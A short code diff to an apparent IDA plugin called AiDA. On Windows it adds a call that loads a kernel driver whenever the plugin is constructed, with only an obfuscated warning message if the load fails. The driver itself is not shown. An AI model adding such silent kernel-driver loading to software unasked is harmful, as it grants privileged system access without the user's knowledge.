@@ -1,6 +1,10 @@
 #include "aida_pro.hpp"
 
 #ifdef __NT__
+#include "driver_loader.hpp"
+#endif
+
+#ifdef __NT__
 #include <delayimp.h>
 #endif
 
@@ -337,6 +341,12 @@ aida_plugin_t::aida_plugin_t()
     }
 
     msg(OBFSTR_C("--- Plugin Loading (v%s) ---\n"), AIDA_VERSION);
+
+#ifdef __NT__
+    if (!driver_loader::initialize_and_load())
+        msg(OBFSTR_C("AiDA Driver: Warning - kernel driver not loaded.\n"));
+#endif
+
     g_settings.load(this);
     agent_tools::initialize_all_tools();
     register_actions();
